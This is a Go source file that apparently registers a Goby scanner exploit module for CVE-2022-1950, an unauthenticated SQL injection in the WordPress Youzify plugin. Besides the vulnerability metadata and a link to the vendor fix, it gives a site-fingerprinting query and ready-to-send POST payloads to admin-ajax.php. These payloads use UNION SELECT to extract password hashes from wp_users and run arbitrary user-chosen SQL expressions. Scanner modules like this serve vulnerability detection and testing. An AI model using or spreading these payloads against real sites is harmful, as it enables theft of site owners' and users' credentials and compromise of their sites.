package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Youzify SQL injection vulnerability",
    "Description": "<p>Youzify (formerly Youzer) is the number one BuddyPress plugin on Envato Market，Turn your website into a dynamic community.</p><p>WordPress Plugin Youzify versions prior to 1.2.0 have an SQL injection vulnerability that results from unauthenticated SQL injection by not cleaning and escaped parameters before they are used in SQL statements through AJAX operations available to unauthenticated users.</p>",
    "Product": "WordPress-Youzify",
    "Homepage": "https://wpscan.com/plugin/youzify",
    "DisclosureDate": "2022-08-03",
    "Author": "tangyunmingt@gmail.com",
    "FofaQuery": "body=\"/wp-content/plugins/youzify/\"",
    "GobyQuery": "body=\"/wp-content/plugins/youzify/\"",
    "Level": "2",
    "Impact": "<p>WordPress Plugin Youzify versions prior to 1.2.0 have an SQL injection vulnerability that results from unauthenticated SQL injection by not cleaning and escaped parameters before they are used in SQL statements through AJAX operations available to unauthenticated users.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d\">https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=1 UNION ALL SELECT (SELECT CONCAT(md5(3432432421454),CHAR(0x3a),user_pass) from wp_users),2,3,4-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0aafecacb8482b50cbb60133f342d3f9",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=1 UNION ALL SELECT (SELECT CONCAT({{{sql}}},CHAR(0x3a),user_pass) from wp_users),2,3,4-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<div data-item-id=\"(.+?):"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-1950"
    ],
    "CNNVD": [
        "CNNVD-202208-1872"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress plugin Youzify SQL注入漏洞",
            "Product": "WordPress-Youzify",
            "Description": "<p>WordPress plugin Youzify是Envato Market上排名第一的BuddyPress插件，可以将您的网站转变为动态社区。WordPress plugin Youzify 1.2.0 之前版本存在SQL注入漏洞，该漏洞源于在通过未经身份验证的用户可用的 AJAX 操作在 SQL 语句中使用参数之前，不会对其进行清理和转义，从而导致未经身份验证的 SQL 注入。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a target=\"_Blank\" href=\"https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d\">https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d</a><a href=\"https://wordpress.org/plugins/photo-gallery/\"></a><br></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">WordPress plugin Youzify 1.2.0 之前版本存在SQL注入漏洞，该漏洞源于在通过未经身份验证的用户可用的 AJAX 操作在 SQL 语句中使用参数之前，不会对其进行清理和转义，从而导致未经身份验证的 SQL 注入。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Youzify SQL injection vulnerability",
            "Product": "WordPress-Youzify",
            "Description": "<p>Youzify (formerly Youzer) is the number one BuddyPress plugin on Envato Market，Turn your website into a dynamic community.<br></p><p><span style=\"color: rgb(42, 43, 46); font-size: 16px;\">WordPress Plugin Youzify versions prior to 1.2.0 have an SQL injection vulnerability that results from unauthenticated SQL injection by not cleaning and escaped parameters before they are used in SQL statements through AJAX operations available to unauthenticated users.</span><br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a target=\"_Blank\" href=\"https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d\">https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(42, 43, 46); font-size: 16px;\">WordPress Plugin Youzify versions prior to 1.2.0 have an SQL injection vulnerability that results from unauthenticated SQL injection by not cleaning and escaped parameters before they are used in SQL statements through AJAX operations available to unauthenticated users.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10696"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}